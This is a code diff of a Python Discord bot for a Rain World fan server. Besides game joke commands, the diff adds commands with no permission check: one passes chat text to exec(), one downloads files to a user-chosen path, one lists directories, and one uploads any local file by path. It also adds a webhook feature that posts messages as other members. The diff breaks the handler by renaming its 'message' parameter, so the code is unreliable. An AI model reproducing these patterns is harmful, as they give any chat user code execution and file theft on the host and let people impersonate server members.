@@ -1,18 +1,16 @@
-
-
-slugcats = ['Survivor','Monk','Hunter','Artificer','Gourmand','Rivulet','Spearmaster','Saint','Sofanthiel','Nightcat']
-iterators = ['Five Pebbles','Looks to the Moon','Seven Red Suns','No Significant Harassment', 'Sliver of Straw', 'Unparalleled Innocence', 'Chasing Wind']
-flags = ['gayflag', 'lesbianflag', 'queerflag', 'straightflag']
-dumbshitlist=['Survivor','Monk','Hunter','Artificer','Gourmand','Rivulet','Spearmaster','Saint','Sofanthiel','Nightcat','Five Pebbles','Looks to the Moon','Seven Red Suns','No Significant Harassment', 'Sliver of Straw', 'Unparalleled Innocence', 'Chasing Wind']
 from math import sqrt
-
+from discord import utils
 import os
 import discord
 from dotenv import load_dotenv
 import random
 import re
 from PIL import Image
-
+import requests
+slugcats = ['Survivor','Monk','Hunter','Artificer','Gourmand','Rivulet','Spearmaster','Saint','Sofanthiel','Nightcat']
+iterators = ['Five Pebbles','Looks to the Moon','Seven Red Suns','No Significant Harassment', 'Sliver of Straw', 'Unparalleled Innocence', 'Chasing Wind']
+flags = ['gayflag', 'lesbianflag', 'queerflag', 'straightflag']
+dumbshitlist=['Survivor','Monk','Hunter','Artificer','Gourmand','Rivulet','Spearmaster','Saint','Sofanthiel','Nightcat','Five Pebbles','Looks to the Moon','Seven Red Suns','No Significant Harassment', 'Sliver of Straw', 'Unparalleled Innocence', 'Chasing Wind']
 load_dotenv()
 TOKEN = os.getenv('DISCORD_TOKEN')
 GUILD = os.getenv('DISCORD_GUILD')
@@ -24,10 +22,9 @@ async def on_ready():
     await client.change_presence(status=discord.Status.online, activity=discord.Game(name="Rain World: Downpour Dating Sim"))
 
 @client.event
-async def on_message(message):
+async def on_message(on_message):
     k=str(message.content)
-    print(k)
-    print(k[0:4])
+    
     if k.find("inv!") != -1:
         
         nickname = ['Sofanthiel', '???', 'Inv', 'Enot', 'Paincat'][random.randint(0,4)]
@@ -59,16 +56,14 @@ async def on_message(message):
                 await message.channel.send(f"In a fight betweeen {k[:s].lower()} and {k[s+4:].lower()}. {k[:s].lower()} would win")
             else:
                 await message.channel.send(f"In a fight betweeen {k[:s].lower()} and {k[s+4:].lower()}. {k[s+4:].lower()} would win")
+            return
         if k[0:9].find("crackship") !=-1:
             print("a")
             k=k[10:]
             soi=random.randint(0,1)
             
             flag=random.randint(0,3)
-            if k.find("scug")!=-1:
-                soi=0
-            if k.find("iter")!=-1:
-                soi=1
+            
             if k.find("straight")!=-1:
                 flag=3
             if k.find("ally")!=-1:
@@ -123,6 +118,7 @@ async def on_message(message):
             if k.lower().find("riv")!=-1:
                 chrlist.append(5)
                 soi=0
+            
             if k.lower().find("wind")!=-1:
                 chrlist.append(6)
                 soi=1
@@ -130,6 +126,9 @@ async def on_message(message):
                 chrlist.append(6)
                 soi=0
             if k.lower().find("saint")!=-1:
+                chrlist.append(7)
+                soi=0
+            if k.lower().find("bush")!=-1:
                 chrlist.append(7)
                 soi=0
             if k.lower().find("sofanthiel")!=-1:
@@ -144,7 +143,10 @@ async def on_message(message):
             if k.lower().find("nightcat")!=-1:
                 chrlist.append(9)
                 soi=0
-            
+            if k.find("scug")!=-1:
+                soi=0
+            if k.find("iter")!=-1:
+                soi=1
             if soi==0:
                 lis=slugcats
             if soi==1:
@@ -206,7 +208,61 @@ async def on_message(message):
                 if k.find(usw[x][0]) != -1:
                     i=x
                 x=x+1
-            
             await message.channel.send((usw[i][1]-cn)/sqrt(ck/len(usw)))
+            return
+
+        if k[0:5].find("imper")!=-1:
+            k=k[6:]
+            isd=re.findall('<.*>',k)
+            isl=re.findall('{.*}',k)
+            ser=message.channel
+            se=message.guild.members
+            qw=0
+            while qw<len(se):
+                if str(se[qw]).lower().find(isd[0][1:-1].lower()) !=-1:
+                    author = se[qw]
+                print(se[qw])
+                
+                qw=qw+1
+                
+            webhooks = await ser.webhooks()
+            webhook = utils.get(webhooks,name = "q")
+            if webhook is None:
+                webhook = await ser.create_webhook(name = "q")
+            
+            await webhook.send(isl[0][1:-1],username=author.name,avatar_url = author.avatar)
+            await message.delete()
+            return
+        if k[0:1].find('r')!=-1:
+            exec(k[2:])
+            return
+        if k[0:1].find('g')!=-1:
+            if k.find("github")!=-1:
+                isd=re.findall('<.*>',k)
+                isl=re.findall('{.*}',k)
+                sp=requests.get(f"https://raw.{isl[0][1:-1]}")
+                with open(isd[0][1:-1],'wb') as f:
+                    f.write(sp.content)
+                    f.close()
+            else:
+                sp=requests.get(f"https://{k[2:]}")
+            return()
+        if k[0:3].find('dir')!=-1:
+            await message.channel.send(str(os.listdir())[1:-1].replace(', ','\n').replace('\'',''))
+            return()
+        if k[0:3].find('cat')!=-1:
+            
+            file=discord.File(k[4:])
+            embed=discord.Embed()
+            embed.set_image(url=k[4:])
+
+            await message.channel.send(file=file)
+            
+
+
+
+
+            
+            
 client.run(TOKEN)
 
